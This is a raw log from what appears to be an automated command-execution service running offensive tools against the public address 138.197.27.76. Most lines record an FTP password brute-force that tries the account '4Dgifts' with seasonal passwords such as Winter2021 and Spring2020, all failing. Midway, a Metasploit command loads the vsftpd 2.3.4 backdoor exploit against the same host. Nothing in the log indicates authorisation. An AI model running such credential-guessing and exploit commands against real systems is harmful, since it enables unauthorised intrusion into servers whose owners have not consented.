2025-10-24 01:39:18,254 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2021 (Incorrect: )
2025-10-24 01:39:19,033 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m63.6%[0m ETA: 109.3s Speed: 142 B/s | 190.7s | PID: 44299
2025-10-24 01:39:19,834 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m63.8%[0m ETA: 108.5s Speed: 142 B/s | 191.5s | PID: 44299
2025-10-24 01:39:20,637 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.1%[0m ETA: 107.7s Speed: 141 B/s | 192.3s | PID: 44299
2025-10-24 01:39:21,439 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.4%[0m ETA: 106.9s Speed: 141 B/s | 193.1s | PID: 44299
2025-10-24 01:39:21,820 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:winter2021 (Incorrect: )
2025-10-24 01:39:22,239 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.6%[0m ETA: 106.1s Speed: 141 B/s | 193.9s | PID: 44299
2025-10-24 01:39:23,041 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.9%[0m ETA: 105.3s Speed: 140 B/s | 194.7s | PID: 44299
2025-10-24 01:39:23,845 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m65.2%[0m ETA: 104.5s Speed: 139 B/s | 195.5s | PID: 44299
2025-10-24 01:39:24,649 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m65.4%[0m ETA: 103.7s Speed: 139 B/s | 196.3s | PID: 44299
2025-10-24 01:39:25,450 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m65.7%[0m ETA: 102.9s Speed: 138 B/s | 197.1s | PID: 44299
2025-10-24 01:39:25,467 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Spring2020 (Incorrect: )
2025-10-24 01:39:26,251 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m66.0%[0m ETA: 102.1s Speed: 138 B/s | 197.9s | PID: 44299
2025-10-24 01:39:27,051 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m66.2%[0m ETA: 101.3s Speed: 138 B/s | 198.7s | PID: 44299
2025-10-24 01:39:27,852 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m66.5%[0m ETA: 100.5s Speed: 137 B/s | 199.5s | PID: 44299
2025-10-24 01:39:28,653 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m66.8%[0m ETA: 99.7s Speed: 137 B/s | 200.3s | PID: 44299
2025-10-24 01:39:28,994 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:spring2020 (Incorrect: )
2025-10-24 01:39:29,454 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.0%[0m ETA: 98.9s Speed: 137 B/s | 201.1s | PID: 44299
2025-10-24 01:39:30,255 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.3%[0m ETA: 98.1s Speed: 136 B/s | 201.9s | PID: 44299
2025-10-24 01:39:31,057 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.6%[0m ETA: 97.3s Speed: 136 B/s | 202.7s | PID: 44299
2025-10-24 01:39:31,857 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.8%[0m ETA: 96.5s Speed: 135 B/s | 203.5s | PID: 44299
2025-10-24 01:39:32,076 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2020 (Incorrect: )
2025-10-24 01:39:32,659 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.1%[0m ETA: 95.7s Speed: 135 B/s | 204.3s | PID: 44299
2025-10-24 01:39:33,460 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.4%[0m ETA: 94.9s Speed: 134 B/s | 205.1s | PID: 44299
2025-10-24 01:39:34,261 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.6%[0m ETA: 94.1s Speed: 134 B/s | 205.9s | PID: 44299
2025-10-24 01:39:35,061 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.9%[0m ETA: 93.3s Speed: 133 B/s | 206.7s | PID: 44299
2025-10-24 01:39:35,238 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:summer2020 (Incorrect: )
2025-10-24 01:39:35,863 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m69.2%[0m ETA: 92.5s Speed: 133 B/s | 207.5s | PID: 44299
2025-10-24 01:39:36,664 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m69.4%[0m ETA: 91.7s Speed: 133 B/s | 208.3s | PID: 44299
2025-10-24 01:39:37,465 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m69.7%[0m ETA: 90.9s Speed: 132 B/s | 209.1s | PID: 44299
2025-10-24 01:39:38,269 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m70.0%[0m ETA: 90.1s Speed: 132 B/s | 209.9s | PID: 44299
2025-10-24 01:39:38,836 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Autumn2020 (Incorrect: )
2025-10-24 01:39:39,071 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m70.2%[0m ETA: 89.3s Speed: 132 B/s | 210.7s | PID: 44299
2025-10-24 01:39:39,871 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m70.5%[0m ETA: 88.5s Speed: 131 B/s | 211.5s | PID: 44299
2025-10-24 01:39:40,672 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m70.8%[0m ETA: 87.7s Speed: 131 B/s | 212.3s | PID: 44299
2025-10-24 01:39:41,473 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.0%[0m ETA: 86.9s Speed: 130 B/s | 213.1s | PID: 44299
2025-10-24 01:39:42,144 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:autumn2020 (Incorrect: )
2025-10-24 01:39:42,274 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.3%[0m ETA: 86.1s Speed: 130 B/s | 213.9s | PID: 44299
2025-10-24 01:39:43,075 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.6%[0m ETA: 85.3s Speed: 130 B/s | 214.7s | PID: 44299
2025-10-24 01:39:43,875 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.8%[0m ETA: 84.5s Speed: 129 B/s | 215.5s | PID: 44299
2025-10-24 01:39:44,676 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.1%[0m ETA: 83.7s Speed: 129 B/s | 216.3s | PID: 44299
2025-10-24 01:39:45,478 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.4%[0m ETA: 82.8s Speed: 129 B/s | 217.2s | PID: 44299
2025-10-24 01:39:46,008 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Fall2020 (Incorrect: )
2025-10-24 01:39:46,279 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.7%[0m ETA: 82.0s Speed: 129 B/s | 218.0s | PID: 44299
2025-10-24 01:39:47,080 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.9%[0m ETA: 81.2s Speed: 128 B/s | 218.8s | PID: 44299
2025-10-24 01:39:47,881 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m73.2%[0m ETA: 80.4s Speed: 128 B/s | 219.6s | PID: 44299
2025-10-24 01:39:48,684 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m73.5%[0m ETA: 79.6s Speed: 127 B/s | 220.4s | PID: 44299
2025-10-24 01:39:49,434 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:fall2020 (Incorrect: )
2025-10-24 01:39:49,485 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m73.7%[0m ETA: 78.8s Speed: 127 B/s | 221.2s | PID: 44299
2025-10-24 01:39:50,285 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.0%[0m ETA: 78.0s Speed: 127 B/s | 222.0s | PID: 44299
2025-10-24 01:39:51,087 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.3%[0m ETA: 77.2s Speed: 126 B/s | 222.8s | PID: 44299
2025-10-24 01:39:51,888 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.5%[0m ETA: 76.4s Speed: 126 B/s | 223.6s | PID: 44299
2025-10-24 01:39:52,689 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m74.8%[0m ETA: 75.6s Speed: 125 B/s | 224.4s | PID: 44299
2025-10-24 01:39:53,299 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2020 (Incorrect: )
2025-10-24 01:39:53,490 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.1%[0m ETA: 74.8s Speed: 125 B/s | 225.2s | PID: 44299
2025-10-24 01:39:54,293 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.3%[0m ETA: 74.0s Speed: 125 B/s | 226.0s | PID: 44299
2025-10-24 01:39:55,094 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.6%[0m ETA: 73.2s Speed: 124 B/s | 226.8s | PID: 44299
2025-10-24 01:39:55,895 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.9%[0m ETA: 72.4s Speed: 124 B/s | 227.6s | PID: 44299
2025-10-24 01:39:56,697 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m76.1%[0m ETA: 71.6s Speed: 124 B/s | 228.4s | PID: 44299
2025-10-24 01:39:57,005 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:winter2020 (Incorrect: )
2025-10-24 01:39:57,498 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m76.4%[0m ETA: 70.8s Speed: 124 B/s | 229.2s | PID: 44299
2025-10-24 01:39:58,301 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m76.7%[0m ETA: 70.0s Speed: 123 B/s | 230.0s | PID: 44299
2025-10-24 01:39:59,102 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m76.9%[0m ETA: 69.2s Speed: 123 B/s | 230.8s | PID: 44299
2025-10-24 01:39:59,905 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m77.2%[0m ETA: 68.4s Speed: 122 B/s | 231.6s | PID: 44299
2025-10-24 01:40:00,602 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Spring2019 (Incorrect: )
2025-10-24 01:40:00,711 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m77.5%[0m ETA: 67.6s Speed: 122 B/s | 232.4s | PID: 44299
2025-10-24 01:40:01,512 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m77.7%[0m ETA: 66.8s Speed: 122 B/s | 233.2s | PID: 44299
2025-10-24 01:40:02,313 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.0%[0m ETA: 66.0s Speed: 122 B/s | 234.0s | PID: 44299
2025-10-24 01:40:03,114 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.3%[0m ETA: 65.2s Speed: 121 B/s | 234.8s | PID: 44299
2025-10-24 01:40:03,917 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.5%[0m ETA: 64.4s Speed: 121 B/s | 235.6s | PID: 44299
2025-10-24 01:40:03,947 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:spring2019 (Incorrect: )
2025-10-24 01:40:04,719 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.8%[0m ETA: 63.6s Speed: 121 B/s | 236.4s | PID: 44299
2025-10-24 01:40:05,519 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.1%[0m ETA: 62.8s Speed: 120 B/s | 237.2s | PID: 44299
2025-10-24 01:40:06,321 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.3%[0m ETA: 62.0s Speed: 120 B/s | 238.0s | PID: 44299
2025-10-24 01:40:07,122 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.6%[0m ETA: 61.2s Speed: 120 B/s | 238.8s | PID: 44299
2025-10-24 01:40:07,848 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2019 (Incorrect: )
2025-10-24 01:40:07,924 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.9%[0m ETA: 60.4s Speed: 120 B/s | 239.6s | PID: 44299
2025-10-24 01:40:08,725 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.1%[0m ETA: 59.6s Speed: 119 B/s | 240.4s | PID: 44299
2025-10-24 01:40:09,526 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.4%[0m ETA: 58.8s Speed: 119 B/s | 241.2s | PID: 44299
2025-10-24 01:40:10,347 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.7%[0m ETA: 58.0s Speed: 118 B/s | 242.0s | PID: 44299
2025-10-24 01:40:11,148 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.9%[0m ETA: 57.2s Speed: 118 B/s | 242.8s | PID: 44299
2025-10-24 01:40:11,511 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:summer2019 (Incorrect: )
2025-10-24 01:40:11,950 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m81.2%[0m ETA: 56.4s Speed: 118 B/s | 243.6s | PID: 44299
2025-10-24 01:40:12,752 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m81.5%[0m ETA: 55.6s Speed: 118 B/s | 244.4s | PID: 44299
2025-10-24 01:40:13,553 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m81.7%[0m ETA: 54.8s Speed: 117 B/s | 245.2s | PID: 44299
2025-10-24 01:40:14,354 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.0%[0m ETA: 54.0s Speed: 117 B/s | 246.0s | PID: 44299
2025-10-24 01:40:14,734 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Autumn2019 (Incorrect: )
2025-10-24 01:40:15,154 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.3%[0m ETA: 53.2s Speed: 117 B/s | 246.8s | PID: 44299
2025-10-24 01:40:15,956 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.5%[0m ETA: 52.4s Speed: 117 B/s | 247.6s | PID: 44299
2025-10-24 01:40:16,758 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.8%[0m ETA: 51.6s Speed: 116 B/s | 248.4s | PID: 44299
2025-10-24 01:40:17,560 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m83.1%[0m ETA: 50.8s Speed: 116 B/s | 249.2s | PID: 44299
2025-10-24 01:40:17,726 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:autumn2019 (Incorrect: )
2025-10-24 01:40:18,360 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m83.3%[0m ETA: 50.0s Speed: 116 B/s | 250.0s | PID: 44299
2025-10-24 01:40:19,161 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m83.6%[0m ETA: 49.2s Speed: 116 B/s | 250.8s | PID: 44299
2025-10-24 01:40:19,961 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m83.9%[0m ETA: 48.4s Speed: 115 B/s | 251.6s | PID: 44299
2025-10-24 01:40:20,149 - __main__ - INFO - 🔍 Cache MISS for command: msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 138.197.27.76; check; exit"
2025-10-24 01:40:20,149 - __main__ - INFO - 🚀 EXECUTING: msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 138.197.27.76; check; exit"
2025-10-24 01:40:20,150 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:40:20,150 - __main__ - INFO - 🆔 PROCESS: PID 44522 started
2025-10-24 01:40:20,150 - __main__ - INFO - 🆔 REGISTERED: Process 44522 - msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_...
2025-10-24 01:40:20,151 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44522
2025-10-24 01:40:20,762 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.1%[0m ETA: 47.6s Speed: 115 B/s | 252.4s | PID: 44299
2025-10-24 01:40:20,951 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.3%[0m Speed: 0 B/s | 0.8s | PID: 44522
2025-10-24 01:40:21,395 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Fall2019 (Incorrect: )
2025-10-24 01:40:21,562 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.4%[0m ETA: 46.8s Speed: 115 B/s | 253.2s | PID: 44299
2025-10-24 01:40:21,751 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.5%[0m Speed: 0 B/s | 1.6s | PID: 44522
2025-10-24 01:40:22,363 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.7%[0m ETA: 46.0s Speed: 114 B/s | 254.0s | PID: 44299
2025-10-24 01:40:22,556 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.8%[0m Speed: 0 B/s | 2.4s | PID: 44522
2025-10-24 01:40:23,169 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.9%[0m ETA: 45.2s Speed: 114 B/s | 254.8s | PID: 44299
2025-10-24 01:40:23,369 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.1%[0m Speed: 0 B/s | 3.2s | PID: 44522
2025-10-24 01:40:23,711 - __main__ - INFO - 📤 STDOUT: [0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
2025-10-24 01:40:23,711 - __main__ - INFO - 📤 STDOUT: [0mRHOST => 138.197.27.76
2025-10-24 01:40:23,712 - __main__ - INFO - 📤 STDOUT: [0m[1m[31m[-][0m This module does not support check.
2025-10-24 01:40:23,762 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:40:23,769 - __main__ - INFO - 🧹 CLEANUP: Process 44522 removed from registry
2025-10-24 01:40:23,769 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 3.62s
2025-10-24 01:40:23,769 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:40:23,769 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:40:23,769 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:40:23,769 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backd...
2025-10-24 01:40:23,769 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 3.62s
2025-10-24 01:40:23,769 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 164 bytes
2025-10-24 01:40:23,769 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:40:23,769 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:40:23,769 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:40:23,769 - __main__ - INFO - 💾 Cached result for command: msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 138.197.27.76; check; exit"
2025-10-24 01:40:23,770 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:40:23] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:40:23,970 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m85.2%[0m ETA: 44.4s Speed: 114 B/s | 255.6s | PID: 44299
2025-10-24 01:40:24,610 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:fall2019 (Incorrect: )
2025-10-24 01:40:24,771 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m85.5%[0m ETA: 43.6s Speed: 114 B/s | 256.4s | PID: 44299
2025-10-24 01:40:25,571 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m85.7%[0m ETA: 42.8s Speed: 113 B/s | 257.2s | PID: 44299
2025-10-24 01:40:26,372 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m86.0%[0m ETA: 42.0s Speed: 113 B/s | 258.0s | PID: 44299
2025-10-24 01:40:27,174 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m86.3%[0m ETA: 41.2s Speed: 113 B/s | 258.8s | PID: 44299
2025-10-24 01:40:27,976 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m86.5%[0m ETA: 40.4s Speed: 112 B/s | 259.6s | PID: 44299
2025-10-24 01:40:28,237 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2019 (Incorrect: )
2025-10-24 01:40:28,778 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m86.8%[0m ETA: 39.5s Speed: 112 B/s | 260.5s | PID: 44299
2025-10-24 01:40:29,580 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.1%[0m ETA: 38.7s Speed: 112 B/s | 261.3s | PID: 44299
